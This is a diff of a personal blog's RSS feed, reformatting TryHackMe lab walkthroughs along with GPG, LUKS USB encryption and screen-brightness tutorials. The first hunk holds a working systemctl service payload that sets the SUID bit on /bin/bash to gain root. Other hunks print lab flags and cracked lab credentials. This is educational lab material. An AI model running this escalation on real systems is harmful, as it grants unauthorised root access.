 <h3 id="what-is-the-name-of-the-user-who-managers-the-webserver"><em>What is the name of the user who managers the webserver?</em>*</h3>
@@ -318,37 +441,37 @@ ex:</li>
 <p>Ls <code>/home/bill</code> and see <code>user.txt</code></p>
 </li>
 </ul>
-<pre tabindex="0"><code>cat /home/bill/user.txt
-</code></pre><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat /home/bill/user.txt
+</span></span></code></pre></div><ul>
 <li>The contents of <code>user.txt</code>: <code>8bd7992fbe8a6ad22a63361004cfcedb</code></li>
 </ul>
 <h2 id="privilage-escalation">Privilage Escalation</h2>
-<p>Per THM:
-*In Linux, SUID (set owner userId upon execution) is a special type of file permission given to a file. SUID gives temporary permissions to a user to run the program/file with the permission of the file owner (rather than the user who runs it).</p>
-<p>For example, the binary file to change your password has the SUID bit set on it (/usr/bin/passwd). This is because to change your password, it will need to write to the shadowers file that you do not have access to, root does, so it has root privileges to make the right changes.*</p>
+<p>Per THM -<br>
+<em>In Linux, SUID (set owner userId upon execution) is a special type of file permission given to a file. SUID gives temporary permissions to a user to run the program/file with the permission of the file owner (rather than the user who runs it).</em></p>
+<p><em>For example, the binary file to change your password has the SUID bit set on it (/usr/bin/passwd). This is because to change your password, it will need to write to the shadowers file that you do not have access to, root does, so it has root privileges to make the right changes.</em></p>
 <h3 id="on-the-system-search-for-all-suid-files-what-file-stands-out"><strong>On the system search for all SUID files. What file stands out?</strong></h3>
 <ul>
 <li>I tend to use this <code>find</code> command to search for SUID&rsquo;s</li>
 </ul>
-<pre tabindex="0"><code>find / -perm -4000 2&gt;/dev/null
-</code></pre><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -perm -4000 2&gt;/dev/null
+</span></span></code></pre></div><ul>
 <li>Sort of using my own system as a reference, I saw this one looking fairly unusual: <code>/bin/systemctl</code></li>
 </ul>
-<h1 id="heading-8"></h1>
+<h1 id="heading-9"></h1>
 <h3 id="become-root-and-get-the-last-flag-rootroottxt"><strong>Become root and get the last flag (/root/root.txt)</strong></h3>
 <ul>
 <li>Navigating to <a href="https://gtfobins.github.io/gtfobins/">GTFOBins</a> and search for that bin file.</li>
 <li>I took the <code>Sudo (b)</code> one and modified it</li>
 </ul>
-<pre tabindex="0"><code>TF=$(mktemp).service
-echo &#39;[Service]
-Type=oneshot
-ExecStart=/bin/sh -c &#34;chmod +s /bin/bash&#34;
-[Install]
-WantedBy=multi-user.target&#39; &gt; $TF
-/bin/systemctl link $TF
-/bin/systemctl enable --now $TF
-</code></pre><h1 id="heading-9"></h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>TF<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>mktemp<span style="color:#66d9ef">)</span>.service
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;[Service]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Type=oneshot
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ExecStart=/bin/sh -c &#34;chmod +s /bin/bash&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[Install]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">WantedBy=multi-user.target&#39;</span> &gt; $TF
+</span></span><span style="display:flex;"><span>/bin/systemctl link $TF
+</span></span><span style="display:flex;"><span>/bin/systemctl enable --now $TF
+</span></span></code></pre></div><h1 id="heading-10"></h1>
 <ul>
 <li>I literally copy/pasted that chunk into my terminal and ran it.</li>
 <li>Then I ran <code>bash -p</code> to escalate to <code>root</code></li>
@@ -356,6 +479,9 @@ WantedBy=multi-user.target&#39; &gt; $TF
 <li>Cat out root.txt <code>cat /root/root.txt</code></li>
 <li>The contents of root.txt: <code>a58ff8579f0a9270368d33a9966c7fd5</code></li>
 </ul>
+<h1 id="heading-11"></h1>
+<h1 id="heading-12"></h1>
+<p><em>written and performed by jb-williams</em> - <a href="https://github.com/jb-williams/">github</a></p>
 ]]></content>
         </item>
         
@@ -365,24 +491,19 @@ WantedBy=multi-user.target&#39; &gt; $TF
             <pubDate>Wed, 28 Sep 2022 10:21:14 -0500</pubDate>
             
             <guid>https://jb-williams.github.io/jbtech.github.io/posts/2022/09/thm_blue_walkthrough/</guid>
-            <description>Eternal Blue TryHackMe Performed on TryHackMe.com
-Walkthrough by Jb Williams - @_binford - Github
-Fri 09/23/2022 10:16:54 AM
-Note: some output will be shortened denoted by &amp;ldquo;&amp;hellip;.&amp;rdquo;
+            <description>Eternal Blue TryHackMe performed by: jb-williams Note- some output will be shortened denoted by &amp;ldquo;&amp;hellip;.&amp;rdquo;
 Scanning/Recon After finding the IP address, I ran my basic nmap recon:
-nmap -v -sV -sC -oN initial 10.10.10.13 Results:
-PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) .</description>
+nmap -v -sV -sC -oN initial 10.10.10.13 Results -
+PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) .... .... Came back with these results and noticed ports 138 and 445, which are usually SMB so I ran nmap with specific SMB scripts: the first one could work but I don&amp;rsquo;t think my VM could handle it so I did a little research and ran the second cmd</description>
             <content type="html"><![CDATA[<h1 id="eternal-blue-tryhackme">Eternal Blue TryHackMe</h1>
-<p>Performed on <a href="https://tryhackme.com">TryHackMe.com</a></p>
-<p>Walkthrough by Jb Williams - <a href="https://twitter.com/_binford">@_binford</a> - <a href="https://github.com/jb-williams/brightxf">Github</a></p>
-<p>Fri 09/23/2022 10:16:54 AM</p>
+<h4 id="performed-by-jb-williams">performed by: jb-williams</h4>
 <h1 id="heading"></h1>
-<p><strong>Note:</strong> some output will be shortened denoted by &ldquo;&hellip;.&rdquo;</p>
+<p><strong>Note-</strong> some output will be shortened denoted by &ldquo;&hellip;.&rdquo;</p>
 <h1 id="heading-1"></h1>
 <h2 id="scanningrecon">Scanning/Recon</h2>
 <p>After finding the IP address, I ran my basic nmap recon:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -v -sV -sC -oN initial 10.10.10.13
-</span></span></code></pre></div><p><strong>Results</strong>:</p>
+</span></span></code></pre></div><p><strong>Results</strong> -</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PORT      STATE SERVICE       VERSION
 </span></span><span style="display:flex;"><span>135/tcp   open  msrpc         Microsoft Windows RPC
 </span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
@@ -612,7 +733,7 @@ PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open
 </span></span><span style="display:flex;"><span>flag<span style="color:#f92672">{</span>admin_documents_can_be_valuable<span style="color:#f92672">}</span>
 </span></span></code></pre></div><h1 id="heading-7"></h1>
 <h1 id="heading-8"></h1>
-<p><em>written and performed by jb williams</em></p>
+<p><em>written and performed by jb-williams</em> - <a href="https://github.com/jb-williams/">github</a></p>
 ]]></content>
         </item>
         
@@ -622,19 +743,17 @@ PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open
             <pubDate>Sat, 17 Sep 2022 18:46:19 -0500</pubDate>
             
             <guid>https://jb-williams.github.io/jbtech.github.io/posts/2022/09/thm_basic_pentest_walkthrough/</guid>
-            <description>Basic PenTesting Box Facilitated by TryHackMe
-Performed, Written &amp;amp; Compiled by Jb Williams - @_binford - Github
-Summary Hidden directory on webserver(development, found via dirbuster&amp;amp;rockyou).
+            <description>Basic PenTesting TryHackMe performed by: jb-williams Summary Hidden directory on webserver(development, found via dirbuster&amp;amp;rockyou).
 Username (jan and kay found via enum4linux).
 Password(jan:armando found via hydra with ssh).
 Private SSH Key found with Linpeas.
 Cracked SSH Key
 Was able to login and read pass.bak
-User Pass Service SSH Key IP Port jan armando ssh &amp;mdash;&amp;mdash;&amp;mdash;- 10.10.62.206 22 kay beeswax ssh kay_id_rsa 10.</description>
-            <content type="html"><![CDATA[<h1 id="basic-pentesting-box">Basic PenTesting Box</h1>
-<p>Facilitated by <a href="https://tryhackme.com/hacktivities">TryHackMe</a></p>
-<p>Performed, Written &amp; Compiled by Jb Williams - <a href="https://twitter.com/_binford">@_binford</a> - <a href="https://github.com/jb-williams">Github</a></p>
-<h2 id="summary">Summary</h2>
+User Pass Service SSH Key IP Port jan armando ssh &amp;mdash;&amp;mdash;&amp;mdash;- 10.10.62.206 22 kay beeswax ssh kay_id_rsa 10.10.62.206 22 Ports Services 22 SSH 7.2 80 Apache 2.4.18 139 SMB 3.</description>
+            <content type="html"><![CDATA[<h1 id="basic-pentesting-tryhackme">Basic PenTesting TryHackMe</h1>
+<h4 id="performed-by-jb-williams">performed by: jb-williams</h4>
+<h1 id="heading"></h1>
+<h2 id="summary"><strong>Summary</strong></h2>
 <ul>
 <li>
 <p>Hidden directory on webserver(<code>development</code>, found via dirbuster&amp;rockyou).</p>
@@ -873,8 +992,9 @@ User Pass Service SSH Key IP Port jan armando ssh &amp;mdash;&amp;mdash;&amp;mda
 <li>With that I was able to find the Password/Last Flag:</li>
 </ul>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>heresareallystrongpasswordthatfollowsthepasswordpolicy$$
-</span></span></code></pre></div><h1 id="heading"></h1>
-<p>performed, written &amp; compiled by jb williams - <a href="https://twitter.com/_binford">@_binford</a> - <a href="https://github.com/jb-williams">github</a></p>
+</span></span></code></pre></div><h1 id="heading-1"></h1>
+<h1 id="heading-2"></h1>
+<p><em>written and performed by jb-williams</em> - <a href="https://github.com/jb-williams/">github</a></p>
 ]]></content>
         </item>
         
@@ -884,15 +1004,15 @@ User Pass Service SSH Key IP Port jan armando ssh &amp;mdash;&amp;mdash;&amp;mda
             <pubDate>Wed, 31 Aug 2022 17:54:28 -0500</pubDate>
             
             <guid>https://jb-williams.github.io/jbtech.github.io/posts/2022/08/gpg/</guid>
-            <description>GPG Written &amp;amp; Compiled by Jb Williams - @_binford - Github
-GPG(GnuPrivacyGuard) is an Open Source implementation of PGP(PrettyGoodPrivacy). It allows you to encrypt/decrypt and sign data communications.
+            <description>GPG performed by: jb-williams GPG(GnuPrivacyGuard) is an Open Source implementation of PGP(PrettyGoodPrivacy). It allows you to encrypt/decrypt and sign data communications.
 A quick walkthrough of GPG.
 Works on most all OS&amp;rsquo;s, this will be a Linux, and quick Windows walkthrough.
 Public/Private Keys:
-You make a Public Key and a Private Key(always keep Private Key safe and do not share with anyone). You give you Public Key out to anyone.</description>
+You make a Public Key and a Private Key(always keep Private Key safe and do not share with anyone). You give you Public Key out to anyone. They use your Public Key to encrypt the message they want to send to you and you decrypt it with your Private Key.</description>
             <content type="html"><![CDATA[<h1 id="gpg">GPG</h1>
-<p>Written &amp; Compiled by Jb Williams - <a href="https://twitter.com/_binford">@_binford</a> - <a href="https://github.com/jb-williams/Bash_Projects/tree/main/GPG">Github</a></p>
+<h4 id="performed-by-jb-williams">performed by: jb-williams</h4>
 <h1 id="heading"></h1>
+<h1 id="heading-1"></h1>
 <p>GPG(GnuPrivacyGuard) is an Open Source implementation of PGP(PrettyGoodPrivacy). It allows you to encrypt/decrypt and sign data communications.</p>
 <p>A quick walkthrough  of GPG.</p>
 <p>Works on most all OS&rsquo;s, this will be a Linux, and quick Windows walkthrough.</p>
@@ -911,10 +1031,10 @@ You make a Public Key and a Private Key(always keep Private Key safe and do not 
 <ul>
 <li>N*2  \</li>
 </ul>
-<h1 id="heading-1"></h1>
+<h1 id="heading-2"></h1>
 </li>
 </ul>
-<h1 id="heading-2"></h1>
+<h1 id="heading-3"></h1>
 <h1 id="linux">Linux</h1>
 <h2 id="step-1-create-a-key-pair">Step 1 Create a Key Pair</h2>
 <p>  The first step in using asymmetric encryption is to generate a key pair. We will be using Charles and Jack as example people.</p>
@@ -1139,8 +1259,8 @@ This part was just a quick overview of the signing.</p>
     <img src="/img/kleonewpair.PNG"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
 
 
-<h1 id="heading-3"></h1>
 <h1 id="heading-4"></h1>
+<h1 id="heading-5"></h1>
 <ul>
 <li>Now it will ask you to enter your Name and Email, your Identifiers. I would also suggest protecting the generated key with a passphrase. Enter the desired information.</li>
 <li>Click <code>Advanced Settings</code>, this is where you select your encryption type as well as desired usage like Signing, Authentication, and Expiration Date</li>
@@ -1231,8 +1351,6 @@ This part was just a quick overview of the signing.</p>
 <li>Decrypted text will be in your clipboard.</li>
 <li>Open a document and Paste the Decrypted text into that document.</li>
 </ul>
-<h1 id="linksreferences">Links/References</h1>
-<p><em>Twitter</em> - <a href="https://twitter.com/_binford">@_binford</a></p>
 <h2 id="my-simple-programs">My Simple Programs</h2>
 <p>Some simple encrypt/decrypt/signing programs I made.</p>
 <p><a href="https://github.com/jb-williams/Bash_Projects/tree/main/GPG">Github</a></p>
@@ -1252,12 +1370,12 @@ This part was just a quick overview of the signing.</p>
             <pubDate>Fri, 26 Aug 2022 16:43:11 -0500</pubDate>
             
             <guid>https://jb-williams.github.io/jbtech.github.io/posts/2022/08/my_usb_encrypton_process/</guid>
-            <description>LUKS USB Encryption for Linux Tutorial Written &amp;amp; Compiled by Jb Williams - @_binford - Github
-This is the process I use to partition and encrypt usb drives.
+            <description>LUKS USB Encryption for Linux performed by: jb-williams This is the process I use to partition and encrypt usb drives.
 I have not tested tested it on anything other than usb&amp;rsquo;s, though a similar process would potentially work. !! Notice !! Running these commands on the wrong drive could Erase All Data on that Drive!!
-Only Recoverable if You Had a Backup Make sure you know: Device Name(ie: /dev/sdb) Device Size(ie: 15GiB) Reqs:</description>
+Only Recoverable if You Had a Backup Make sure you know: Device Name(ie: /dev/sdb) Device Size(ie: 15GiB) REQS:</description>
             <content type="html"><![CDATA[<h1 id="luks-usb-encryption-for-linux">LUKS USB Encryption for Linux</h1>
-<p>Tutorial Written &amp; Compiled by Jb Williams - <a href="https://twitter.com/_binford">@_binford</a> - <a href="https://github.com/jb-williams">Github</a></p>
+<h4 id="performed-by-jb-williams">performed by: jb-williams</h4>
+<h1 id="heading"></h1>
 <p>This is the process I use to partition and encrypt usb drives.</p>
 <ul>
 <li>I have not tested tested it on anything other than usb&rsquo;s, though a similar process would potentially work.</li>
@@ -1273,13 +1391,15 @@ Only Recoverable if You Had a Backup Make sure you know: Device Name(ie: /dev/sd
 </ul>
 </li>
 </ul>
-<p><strong>Reqs:</strong></p>
+<p>REQS:</p>
 <ul>
-<li>linux</li>
-<li>cryptsetup    (deb package)</li>
-</ul>
-<p><strong>(depending on desired file system)</strong>\</p>
-<ul>
+<li>
+<p>linux</p>
+</li>
+<li>
+<p>cryptsetup    (deb package)<br>
+<strong>(depending on desired file system)</strong></p>
+</li>
 <li>
 <p>dosfstools - FAT32, vfat <em>(can be read by both Windows and Linux)</em></p>
 </li>
@@ -1377,7 +1497,9 @@ Remember USB is /dev/sdb.</li>
 </ul>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>udiskie-mount /dev/sdb1
 </span></span><span style="display:flex;"><span>udiskie-umount /dev/sdb1
-</span></span></code></pre></div><p><em>written &amp; compiled by: jb williams - <a href="https://twitter.com/_binford">@_binford</a> - <a href="https://github.com/jb-williams">github</a></em></p>
+</span></span></code></pre></div><h1 id="heading-1"></h1>
+<h1 id="heading-2"></h1>
+<p><em>written and performed by jb williams</em> - <a href="https://github.com/jb-williams/">github</a></p>
 ]]></content>
         </item>
         
@@ -1387,11 +1509,10 @@ Remember USB is /dev/sdb.</li>
             <pubDate>Fri, 26 Aug 2022 11:59:26 -0500</pubDate>
             
             <guid>https://jb-williams.github.io/jbtech.github.io/posts/2022/08/brightxf/</guid>
-            <description>Brightxf Written &amp;amp; Compiled by Jb Williams - @_binford - Github
-!! Run at Own Risk !!
+            <description>Brightxf performed by: jb-williams !! Run at Own Risk !!
 No issues have come from my use of these but that doesn&amp;rsquo;t mean there won&amp;rsquo;t be I enjoy making/finding the most minimal gui and still be functional as a daily-driver(functional specifically to my needs). I tend to prefer cwm, a simple window manager, and sxhkd, used as a hot-key daemon, and I test my setup on several different laptops of different specs.</description>
-            <content type="html"><![CDATA[<h3 id="brightxf">Brightxf</h3>
-<p>Written &amp; Compiled by Jb Williams - <a href="https://twitter.com/_binford">@_binford</a> - <a href="https://github.com/jb-williams/brightxf">Github</a></p>
+            <content type="html"><![CDATA[<h1 id="brightxf">Brightxf</h1>
+<h4 id="performed-by-jb-williams">performed by: jb-williams</h4>
 <h1 id="heading"></h1>
 <p> <strong>!! Run at Own Risk !!</strong></p>
 <ul>
@@ -1432,8 +1553,10 @@ No issues have come from my use of these but that doesn&amp;rsquo;t mean there w
 </span></span><span style="display:flex;"><span>brup
 </span></span><span style="display:flex;"><span>brmx
 </span></span></code></pre></div><h1 id="heading-1"></h1>
+<h1 id="heading-2"></h1>
 <p><a href="https://github.com/jb-williams/brightxf">SourceCode</a></p>
-<p><em>written &amp; compiled by: jb williams - <a href="https://twitter.com/_binford">@_binford</a> - <a href="https://github.com/jb-williams">github</a></em></p>
+<h1 id="heading-3"></h1>
+<p><em>written and performed by jb-williams</em> - <a href="https://github.com/jb-williams/">github</a></p>
 ]]></content>
         </item>
         
